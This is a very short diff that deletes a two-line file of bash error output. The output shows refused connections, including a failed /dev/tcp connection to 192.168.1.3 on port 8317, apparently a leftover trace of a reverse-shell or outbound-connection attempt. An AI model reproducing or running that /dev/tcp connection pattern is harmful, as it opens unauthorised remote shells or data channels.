@@ -1,2 +1,0 @@
-bash: connect: Connection refused
-bash: line 1: /dev/tcp/192.168.1.3/8317: Connection refused
